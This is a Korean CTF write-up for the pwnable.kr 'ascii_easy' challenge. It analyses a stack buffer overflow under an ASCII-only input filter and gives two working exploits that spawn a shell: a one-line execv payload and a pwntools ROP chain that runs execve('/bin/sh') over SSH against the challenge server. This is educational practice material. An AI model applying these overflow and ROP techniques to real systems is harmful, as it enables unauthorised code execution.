---
title: "[pwnable] ascii_easy"
date: 2025-02-24 07:00:00 +0900
categories: [pwnable]
tags: [pwnable]
description: pwnable, system hack
---

### 스택 프레임
![alt text](assets/img/ascii_easy/image-7.png)
func1과 func2를 차례대로 호출했을 때.   
buf(로컬변수)와 return address 사이에 SFP(stack frame pointer)가 있는 것을 볼 수 있습니다.   

### 코드 분석

```c
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

#define BASE ((void*)0x5555e000)

int is_ascii(int c){
    if(c>=0x20 && c<=0x7f) return 1;
    return 0;
}

void vuln(char* p){
    char buf[20];
    strcpy(buf, p);
}

void main(int argc, char* argv[]){

    if(argc!=2){
        printf("usage: ascii_easy [ascii input]\n");
        return;
    }

    size_t len_file;
    struct stat st;
    int fd = open("libc-2.15.so", O_RDONLY);
    if( fstat(fd,&st) < 0){
        printf("open error. tell admin!\n");
        return;
    }

    len_file = st.st_size;
    if (mmap(BASE, len_file, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE, fd, 0) != BASE){
        printf("mmap error!. tell admin\n");
        return;
    }

    int i;
    for(i=0; i<strlen(argv[1]); i++){
        if( !is_ascii(argv[1][i]) ){
            printf("you have non-ascii byte!\n");
            return;
        }
    }

    printf("triggering bug...\n");
    vuln(argv[1]);

}
```

mmap 함수를 통해 libc 라이브러리 파일을 통으로 메모리에 올리는 것을 확인할 수 있습니다.   
또, vuln 함수에서 커맨드라인 인자로 받은 문자열을 그대로 strcpy를 하는 것을 보아,
스택 버퍼 오버플로우 공격을 사용해야 하는 것을 알 수 있었습니다.



### 바이너리 분석
![alt text](assets/img/ascii_easy/image-9.png)
main과 vuln함수에 breakpoint를 걸어두고, `r aaaa`로 실행을 시켜보았습니다.   
vuln 함수 안에서, strcpy 이후 스택을 조사해 보니, `0x61616161(aaaa)`의 위치부터 return address인 `0x0804865f(main+300)` 까지 32바이트의 공간이 있는 것을 확인했습니다.   
따라서, 더미데이터 32바이트 뒤에 system 함수 혹은 exec함수의 주소, 인자들을 덧붙여 덮어씌우면 될 것으로 예상했습니다.   

이 문제에서는 ascii 바이트(c>=0x20 && c<=0x7f)만 입력이 가능하기 때문에 mmap으로 메모리에 올린 libc 내에서 주소를 찾아 payload를 만들어야 합니다.   


#### 함수 위치를 찾는 커맨드라인 명령어
`nm -D libc-2.15.so | grep exec | awk '{printf "0х%x\n", strtonum("0x"$1) + 0x5555e000}'`

`nm -D libc-2.15.so | grep system | awk '{printf "0х%x\n", strtonum("0x"$1) + 0x5555e000}'`

nm 명령어와 grep, awk를 이용하여 exec과 system 함수가 mmap 이후에 어디에 위치할 지 출력해 보았습니다.   

![alt text](assets/img/ascii_easy/image-10.png)

![alt text](assets/img/ascii_easy/image-11.png)

system은 is_ascii 함수를 통과하는 주소가 없고,   
exec 계열 함수 중 execv, execvp함수와 fexecve 함수가 is_ascii 함수를 통과하는 것을 알 수 있었습니다.

* `0x55564a36` null
* `0x55616740` execv -> 5561676a
* `0x55564b4c` "A"

![alt text](assets/img/ascii_easy/image-12.png)

`/bin/sh` 문자열은 libc 내부에 존재하지만, is_ascii 함수를 통과하지 못하는 주소였습니다.


### symlink 풀이
tmp 디렉토리 아래에 symlink 파일을 하나 만들어 줍니다.
```
ln -s /bin/sh A
```

```
~/ascii_easy $(python -c "print 'A'*32 + '\x6a\x67\x61\x55' + '\x4c\x4b\x56\x55' + '\x36\x4a\x56\x55'*2");
```
 
<!-- ![alt text](image.png) -->
<br/>
<br/>


### ROP gadget 풀이
#### ROPgadget 찾기   
`ROPgadget --binary libc-2.15.so > gadget.txt`   

#### offset 더하기
`awk '{ addr = strtonum($1); newaddr = addr + 0x5555e000; $1 = sprintf("0x%08x", newaddr); print; }' gadget.txt > newgadget.txt`

#### rop chain exploit
``` python
from pwn import *

pop_edx    = 0x555f3555 
memory_addr = 0x55562023 
mov_edx_edi = 0x55687b3c 
mov_edx_eax = 0x5560645c 
pop_ecx    = 0x556d2a51 
pop_ebx    = 0x5557734e 
inc_eax    = 0x556c6864 
int_80     = 0x55667176 

payload  = b"a"*32

# memory addr에 /bin 로드
payload += p32(pop_edx) # pop edx; xor eax, eax; pop edi; ret
payload += p32(memory_addr) # "/bin/sh" 를 저장할 메모리 주소
payload += b'/bin' # 4바이트 문자열
payload += p32(mov_edx_edi) # mov [edx], edi; pop esi; pop edi; ret
payload += b"a"*8 # dummy 바이트, 위 mov edx edi 이후 pop을 두번 함

# memory addr +4에 //sh 로드
payload += p32(pop_edx) # pop edx; xor eax, eax; pop edi; ret
payload += p32(memory_addr + 4) # "/bin/sh" 를 저장할 메모리 주소
payload += b'//sh' # 4바이트 문자열
payload += p32(mov_edx_edi) # mov [edx], edi; pop esi; pop edi; ret
payload += b"a"*8 # dummy 바이트, 위 mov edx edi 이후 pop을 두번 함

# memory addr +8에 null 로드 
payload += p32(pop_edx) # pop edx; xor eax, eax; pop edi; ret
payload += p32(memory_addr + 8) # "/bin/sh" 를 저장할 메모리 주소
payload += b"a"*4 # dummy 바이트, 위 pop edx 이후 pop을 한번 함
payload += p32(mov_edx_eax) # mov [edx], eax; ret, eax에는 xor연산으로 0이 저장되어있음

# edx에 null 로드
payload += p32(pop_edx) # pop edx; xor eax, eax; pop edi; ret
payload += p32(memory_addr + 8) # null이 저장된 주소
payload += b"a"*4

# ecx에 null 로드
payload += p32(pop_ecx) # pop ecx; add al, 0xa; ret
payload += p32(memory_addr + 8) # null이 저장된 주소

# ebx에 "/bin/sh" 로드
payload += p32(pop_ebx) # pop ebx; ret
payload += p32(memory_addr) # "/bin/sh"가 저장된 주소

# syscall 호출, 11번은 execve
payload += p32(inc_eax) # 위에서 xor eax, eax; 와 add al, 0xa를 통해 eax에는 10이 있음. 1을 더해 11로 만듦
payload += p32(int_80)

sh = ssh('ascii_easy', 'pwnable.kr', 2222, 'guest')
p = sh.process(['/home/ascii_easy/ascii_easy', payload], tty=True)

p.interactive()


```